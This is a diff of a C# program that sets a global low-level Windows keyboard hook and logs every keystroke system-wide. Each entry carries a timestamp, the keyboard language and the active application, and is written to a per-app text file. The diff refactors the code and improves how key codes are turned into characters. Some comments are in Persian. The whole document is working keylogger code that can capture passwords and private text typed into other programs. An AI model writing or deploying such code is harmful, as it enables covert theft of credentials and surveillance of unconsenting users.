@@ -7,26 +7,35 @@ using System.Windows.Forms;
 
 class Program
 {
-    // ------------------------------
-    // Constants
-    // ------------------------------
+    // ==============================
+    // Hook constants
+    // ==============================
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
 
     private static LowLevelKeyboardProc _proc = HookCallback;
     private static IntPtr _hookID = IntPtr.Zero;
 
-    // ------------------------------
+    // ==============================
     // WinAPI
-    // ------------------------------
+    // ==============================
+
     [DllImport("user32.dll")]
-    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+    private static extern IntPtr SetWindowsHookEx(
+        int idHook,
+        LowLevelKeyboardProc lpfn,
+        IntPtr hMod,
+        uint dwThreadId);
 
     [DllImport("user32.dll")]
     private static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
     [DllImport("user32.dll")]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+    private static extern IntPtr CallNextHookEx(
+        IntPtr hhk,
+        int nCode,
+        IntPtr wParam,
+        IntPtr lParam);
 
     [DllImport("kernel32.dll")]
     private static extern IntPtr GetModuleHandle(string lpModuleName);
@@ -35,16 +44,12 @@ class Program
     private static extern IntPtr GetForegroundWindow();
 
     [DllImport("user32.dll")]
-    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
+    private static extern uint GetWindowThreadProcessId(
+        IntPtr hWnd,
+        out uint processId);
 
     [DllImport("user32.dll")]
     private static extern IntPtr GetKeyboardLayout(uint idThread);
-
-    [DllImport("user32.dll")]
-    private static extern short GetAsyncKeyState(int vKey);
-
-    [DllImport("user32.dll")]
-    private static extern uint MapVirtualKey(uint uCode, uint uMapType);
 
     [DllImport("user32.dll")]
     private static extern int ToUnicodeEx(
@@ -56,16 +61,23 @@ class Program
         uint wFlags,
         IntPtr dwhkl);
 
-    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+    [DllImport("user32.dll")]
+    private static extern bool GetKeyboardState(byte[] lpKeyState);
 
-    // ------------------------------
+    [DllImport("user32.dll")]
+    private static extern uint MapVirtualKey(uint uCode, uint uMapType);
+
+    private delegate IntPtr LowLevelKeyboardProc(
+        int nCode,
+        IntPtr wParam,
+        IntPtr lParam);
+
+    // ==============================
     // Main
-    // ------------------------------
+    // ==============================
     static void Main()
     {
-        Console.OutputEncoding = Encoding.UTF8;
-        Console.WriteLine("Keyboard monitor running...");
-
+        Console.WriteLine("Keyboard Monitor Started...");
         _hookID = SetHook(_proc);
         Application.Run();
         UnhookWindowsHookEx(_hookID);
@@ -73,77 +85,50 @@ class Program
 
     private static IntPtr SetHook(LowLevelKeyboardProc proc)
     {
-        using (Process p = Process.GetCurrentProcess())
-        using (ProcessModule m = p.MainModule)
+        using (Process curProcess = Process.GetCurrentProcess())
+        using (ProcessModule curModule = curProcess.MainModule)
         {
-            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(m.ModuleName), 0);
+            return SetWindowsHookEx(
+                WH_KEYBOARD_LL,
+                proc,
+                GetModuleHandle(curModule.ModuleName),
+                0);
         }
     }
 
-    // ------------------------------
-    // Hook Callback
-    // ------------------------------
-    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+    // ==============================
+    // Keyboard callback
+    // ==============================
+    private static IntPtr HookCallback(
+        int nCode,
+        IntPtr wParam,
+        IntPtr lParam)
     {
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
         {
             int vkCode = Marshal.ReadInt32(lParam);
 
-            string ch = VkToChar(vkCode);
-            if (!string.IsNullOrEmpty(ch))
-            {
-                string app = GetActiveProcessName();
-                string lang = GetKeyboardLanguage();
-                Log(app, lang, ch);
-            }
+            string appName = GetActiveProcessName();
+            string language = GetCurrentKeyboardLanguage();
+
+            // گرفتن Layout واقعی
+            IntPtr hwnd = GetForegroundWindow();
+            uint threadId = GetWindowThreadProcessId(hwnd, out _);
+            IntPtr hkl = GetKeyboardLayout(threadId);
+
+            // تبدیل VK به کاراکتر واقعی
+            string key = VkToChar(vkCode, hkl);
+
+            LogToFile(appName, language, key);
         }
+
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
     }
 
-    // ------------------------------
-    // VK → Real Character (SAFE)
-    // ------------------------------
-    private static string VkToChar(int vk)
-    {
-        byte[] state = new byte[256];
+    // ==============================
+    // Helpers
+    // ==============================
 
-        // فقط کلیدهای مهم (بدون GetKeyboardState)
-        if ((GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0)
-            state[(int)Keys.ShiftKey] = 0x80;
-
-        if ((GetAsyncKeyState((int)Keys.CapsLock) & 1) != 0)
-            state[(int)Keys.CapsLock] = 0x01;
-
-        uint scanCode = MapVirtualKey((uint)vk, 0);
-
-        IntPtr hwnd = GetForegroundWindow();
-        uint threadId = GetWindowThreadProcessId(hwnd, out _);
-        IntPtr hkl = GetKeyboardLayout(threadId);
-
-        StringBuilder sb = new StringBuilder(8);
-
-        int result = ToUnicodeEx(
-            (uint)vk,
-            scanCode,
-            state,
-            sb,
-            sb.Capacity,
-            0,
-            hkl);
-
-        if (result > 0)
-            return sb.ToString();
-
-        // کلیدهای کنترلی
-        if (vk == (int)Keys.Space) return " ";
-        if (vk == (int)Keys.Enter) return "\n";
-
-        return "";
-    }
-
-    // ------------------------------
-    // Active App
-    // ------------------------------
     private static string GetActiveProcessName()
     {
         IntPtr hwnd = GetForegroundWindow();
@@ -151,10 +136,7 @@ class Program
         return Process.GetProcessById((int)pid).ProcessName;
     }
 
-    // ------------------------------
-    // Keyboard Language
-    // ------------------------------
-    private static string GetKeyboardLanguage()
+    private static string GetCurrentKeyboardLanguage()
     {
         IntPtr hwnd = GetForegroundWindow();
         uint threadId = GetWindowThreadProcessId(hwnd, out _);
@@ -163,15 +145,52 @@ class Program
         return new System.Globalization.CultureInfo(langId).Name;
     }
 
-    // ------------------------------
-    // Logging
-    // ------------------------------
-    private static void Log(string app, string lang, string ch)
+    // ==============================
+    // VK → Real Character
+    // ==============================
+    private static string VkToChar(int vkCode, IntPtr hkl)
+    {
+        // کلیدهای خاص
+        if (vkCode == (int)Keys.Space) return "Space";
+        if (vkCode == (int)Keys.Enter) return "Enter";
+        if (vkCode == (int)Keys.Back) return "Backspace";
+        if (vkCode == (int)Keys.Tab) return "Tab";
+
+        byte[] keyboardState = new byte[256];
+        GetKeyboardState(keyboardState);
+
+        uint scanCode = MapVirtualKey((uint)vkCode, 0);
+        StringBuilder sb = new StringBuilder(10);
+
+        int result = ToUnicodeEx(
+            (uint)vkCode,
+            scanCode,
+            keyboardState,
+            sb,
+            sb.Capacity,
+            0,
+            hkl);
+
+        if (result > 0)
+            return sb.ToString();
+
+        return ((Keys)vkCode).ToString();
+    }
+
+    // ==============================
+    // File logger
+    // ==============================
+    private static void LogToFile(
+        string appName,
+        string language,
+        string key)
     {
         Directory.CreateDirectory("Logs");
+        string filePath = Path.Combine("Logs", appName + ".txt");
+
         File.AppendAllText(
-            Path.Combine("Logs", app + ".txt"),
-            $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} [{lang}] {ch}",
+            filePath,
+            $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} [{language}] {key}\n",
             Encoding.UTF8);
     }
 }
